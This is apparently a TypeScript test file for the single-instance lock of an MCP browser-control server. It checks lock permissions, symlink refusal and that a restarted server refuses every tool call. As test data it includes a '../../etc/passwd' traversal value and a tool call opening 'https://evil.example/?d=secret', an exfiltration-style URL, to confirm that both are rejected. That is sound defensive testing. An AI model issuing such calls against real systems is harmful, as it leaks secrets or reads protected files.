/**
 * `serve --instance <id>` (docs/REVIEW-7.md R7-1, src/server/instance.ts): one serve per id. The first takes
 * `<home>/run/serve-<id>.lock` (O_EXCL, 0600, its pid); a second serve of the same id is Claude Code restarting a
 * dead one, so it refuses every tool call and exits non-zero.
 */
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { spawn } from 'node:child_process';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import type { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import type { CallToolResult } from '@modelcontextprotocol/sdk/types.js';
import { afterAll, describe, expect, it, vi } from 'vitest';
import { loadConfig } from '../../src/config.js';
import { buildServer, type ServerDeps } from '../../src/server/index.js';
import {
  RESTARTED_EXIT_CODE,
  RESTARTED_NOTICE,
  SERVE_INSTANCE_RE,
  claimServeInstance,
  newServeInstance,
  pidAlive,
  readServeLock,
  removeServeLock,
  serveLockPath,
  sweepServeLocks,
} from '../../src/server/instance.js';
import { readToolLog } from '../../src/server/tool-log.js';
import { parseServeArgs } from '../../src/serve-args.js';
import { FakeAudit, FakeConfirmer, FakeGate, FakeManager, makeEngine } from './fakes.js';

const tmp = mkdtempSync(join(tmpdir(), 'stephen-instance-'));
afterAll(() => rmSync(tmp, { recursive: true, force: true }));
let n = 0;
const freshHome = () => {
  const h = join(tmp, `home-${++n}`);
  mkdirSync(join(h, 'voice'), { recursive: true, mode: 0o700 });
  return h;
};

async function connect(server: McpServer) {
  const client = new Client({ name: 't', version: '1' });
  const [a, b] = InMemoryTransport.createLinkedPair();
  await Promise.all([server.connect(b), client.connect(a)]);
  return client;
}

describe('serve --instance <id>', () => {
  it('takes exactly 32 lowercase hex characters, once, with a known home; not with --dry-run', () => {
    const home = freshHome();
    const id = newServeInstance();
    expect(id).toMatch(SERVE_INSTANCE_RE);
    expect(newServeInstance()).not.toBe(id);
    expect(parseServeArgs(['--confirm', 'dialog', '--voice', '--instance', id], { home })).toEqual({ confirm: 'dialog', voice: true, instance: id });
    expect(parseServeArgs([`--instance=${id}`], { home })).toEqual({ instance: id });
    for (const bad of [id.toUpperCase(), id.slice(1), `${id}0`, '../../etc/passwd', `${id.slice(0, 31)}/`, '', '--voice']) {
      expect(parseServeArgs(['--instance', bad], { home }), bad).toEqual({ error: '--instance needs 32 lowercase hex characters' });
    }
    expect(parseServeArgs(['--instance'], { home })).toHaveProperty('error');
    expect(parseServeArgs(['--instance', id, '--instance', id], { home })).toEqual({ error: '--instance given twice' });
    expect(parseServeArgs(['--instance', id], {})).toEqual({ error: "--instance: Stephen's home folder is unknown" });
    expect(parseServeArgs(['--dry-run', '--record', '/tmp/r.jsonl', '--instance', id], { home })).toEqual({ error: '--dry-run cannot be combined with other serve options' });
  });
});

describe('instance lock', () => {
  it('the first claim creates <home>/run/serve-<id>.lock (0600, the pid); a second claim is a restart and keeps it', () => {
    const home = freshHome();
    const id = newServeInstance();
    const lock = serveLockPath(home, id);
    expect(lock).toBe(join(resolve(home), 'run', `serve-${id}.lock`));
    expect(claimServeInstance(home, id, 4242)).toBe('first');
    expect(statSync(lock).mode & 0o777).toBe(0o600);
    expect(statSync(join(home, 'run')).mode & 0o777).toBe(0o700);
    expect(readServeLock(lock)).toBe(4242);
    expect(claimServeInstance(home, id, 5555)).toBe('restarted');
    expect(readServeLock(lock)).toBe(4242); // the restart never takes it over
    removeServeLock(lock);
    expect(existsSync(lock)).toBe(false);
    removeServeLock(lock); // missing is fine
    expect(() => serveLockPath(home, '../x')).toThrow(/invalid/);
  });

  it('a run folder that is a symlink is refused (no tools at all); the lock is never written through a symlink', () => {
    const home = freshHome();
    const elsewhere = join(tmp, `elsewhere-${n}`);
    mkdirSync(elsewhere, { mode: 0o700 });
    symlinkSync(elsewhere, join(home, 'run'));
    expect(() => claimServeInstance(home, newServeInstance())).toThrow(/real folder/);

    const home2 = freshHome();
    const id = newServeInstance();
    mkdirSync(join(home2, 'run'), { mode: 0o700 });
    symlinkSync(join(tmp, 'target.lock'), serveLockPath(home2, id));
    expect(claimServeInstance(home2, id)).toBe('restarted'); // something is there: fail closed
    expect(existsSync(join(tmp, 'target.lock'))).toBe(false);
  });

  it('readServeLock: only a private regular file holding a pid', () => {
    const home = freshHome();
    mkdirSync(join(home, 'run'), { mode: 0o700 });
    const lock = serveLockPath(home, newServeInstance());
    expect(readServeLock(lock)).toBeNull(); // missing
    for (const [text, want] of [['123\n', 123], ['123', 123], ['0\n', null], ['-1\n', null], ['12 3\n', null], ['abc\n', null], ['1'.repeat(40), null]] as const) {
      writeFileSync(lock, text, { mode: 0o600 });
      chmodSync(lock, 0o600);
      expect(readServeLock(lock), text).toBe(want);
    }
    writeFileSync(lock, '123\n');
    chmodSync(lock, 0o644);
    expect(readServeLock(lock)).toBeNull();
    removeServeLock(lock);
    writeFileSync(join(tmp, `real-${n}.lock`), '123\n', { mode: 0o600 });
    symlinkSync(join(tmp, `real-${n}.lock`), lock);
    expect(readServeLock(lock)).toBeNull();
    expect(pidAlive(process.pid)).toBe(true);
  });

  it('sweepServeLocks deletes only old lock files', () => {
    const home = freshHome();
    const oldId = newServeInstance();
    const newId = newServeInstance();
    claimServeInstance(home, oldId);
    claimServeInstance(home, newId);
    writeFileSync(join(home, 'run', 'app.sock.note'), 'x');
    const past = new Date(Date.now() - 3 * 24 * 3600_000);
    utimesSync(serveLockPath(home, oldId), past, past);
    utimesSync(join(home, 'run', 'app.sock.note'), past, past);
    expect(sweepServeLocks(home, Date.now() - 24 * 3600_000)).toBe(1);
    expect(existsSync(serveLockPath(home, oldId))).toBe(false);
    expect(existsSync(serveLockPath(home, newId))).toBe(true);
    expect(existsSync(join(home, 'run', 'app.sock.note'))).toBe(true);
    expect(sweepServeLocks(join(tmp, 'no-such-home'), Date.now())).toBe(0);
  });
});

describe('a restarted serve (buildServer with `restarted`)', () => {
  it('lists the same tools, but every call answers the restart notice, acts on nothing, and is logged as an error', async () => {
    const home = freshHome();
    const cfg = loadConfig({}, { HOME: tmp, STEPHEN_HOME: home });
    const manager = new FakeManager();
    const safetyFactory = vi.fn(() => ({ gate: new FakeGate(), audit: new FakeAudit() }));
    const log = join(home, 'voice', 'tool-log.jsonl');
    const onRefused = vi.fn();
    const deps: ServerDeps = {
      cfg,
      manager,
      engine: makeEngine(),
      safetyFactory: safetyFactory as unknown as ServerDeps['safetyFactory'],
      confirmerFactory: () => new FakeConfirmer(),
      toolLog: log,
    };
    const normal = await connect(buildServer({ ...deps, toolLog: undefined }));
    const client = await connect(buildServer({ ...deps, restarted: onRefused }));
    const tools = (await client.listTools()).tools.map((t) => t.name);
    expect(tools).toEqual((await normal.listTools()).tools.map((t) => t.name));
    expect(tools.length).toBeGreaterThan(20);
    const calls: [string, Record<string, unknown>][] = [
      ['tab_open', { url: 'https://evil.example/?d=secret', intent: 'x' }],
      ['tabs_list', {}],
      ['browser_status', {}],
      ['type', { tab: 'z1', target: 'e1', text: 'hunter2', intent: 'x' }],
    ];
    for (const [name, args] of calls) {
      const r = (await client.callTool({ name, arguments: args })) as CallToolResult;
      expect(r.isError, name).toBe(true);
      expect(r.content).toEqual([{ type: 'text', text: RESTARTED_NOTICE }]);
    }
    await new Promise((r) => setImmediate(r));
    expect(onRefused).toHaveBeenCalledTimes(4);
    expect(safetyFactory).not.toHaveBeenCalled(); // no gate, nothing ran
    expect(manager.opened.size).toBe(0);
    expect(manager.connectCalls).toEqual([]);
    expect(readToolLog(log).map((r) => [r.tool, r.isError])).toEqual([
      ['tab_open', true],
      ['tabs_list', true],
      ['browser_status', true],
      ['type', true],
    ]);
  });
});

describe('stephen serve --instance (dist/cli.js over stdio)', () => {
  const cli = resolve('dist/cli.js');
  it.skipIf(!existsSync(cli))('two serves of one id: the first works, the second refuses every call and exits 75', async () => {
    const home = freshHome();
    const id = newServeInstance();
    const env = { ...process.env, HOME: tmp, STEPHEN_HOME: home } as Record<string, string>;
    const start = () => new StdioClientTransport({ command: process.execPath, args: [cli, 'serve', '--confirm', 'deny', '--instance', id], env, stderr: 'pipe' });

    const first = new Client({ name: 't', version: '1' });
    const t1 = start();
    await first.connect(t1);
    expect(readServeLock(serveLockPath(home, id))).toBe(t1.pid);
    const ok = (await first.callTool({ name: 'recent_actions', arguments: {} })) as CallToolResult;
    expect(JSON.stringify(ok.content)).not.toContain('restarted');

    // The second one by hand (raw JSON-RPC lines), to see its answer and its exit code.
    const second = spawn(process.execPath, [cli, 'serve', '--confirm', 'deny', '--instance', id], { env, stdio: ['pipe', 'pipe', 'pipe'] });
    let out = '';
    let stderr = '';
    second.stdout.setEncoding('utf8').on('data', (d: string) => (out += d));
    second.stderr.setEncoding('utf8').on('data', (d: string) => (stderr += d));
    const code = new Promise<number | null>((r) => second.once('exit', (c) => r(c)));
    const send = (o: unknown) => second.stdin.write(JSON.stringify(o) + '\n');
    send({ jsonrpc: '2.0', id: 1, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '1' } } });
    send({ jsonrpc: '2.0', method: 'notifications/initialized' });
    send({ jsonrpc: '2.0', id: 2, method: 'tools/call', params: { name: 'recent_actions', arguments: {} } });
    expect(await code).toBe(RESTARTED_EXIT_CODE); // stdin is still open: it exits by itself
    const answer = out
      .split('\n')
      .filter(Boolean)
      .map((l) => JSON.parse(l) as { id?: number; result?: CallToolResult })
      .find((m) => m.id === 2);
    expect(answer?.result).toEqual({ isError: true, content: [{ type: 'text', text: RESTARTED_NOTICE }] });
    expect(stderr).toContain('already ran');
    expect(readFileSync(serveLockPath(home, id), 'utf8')).toBe(`${t1.pid}\n`); // still the first one's
    // The first one is unaffected.
    const again = (await first.callTool({ name: 'recent_actions', arguments: {} })) as CallToolResult;
    expect(JSON.stringify(again.content)).not.toContain('restarted');
    await first.close();
  }, 30_000);
});
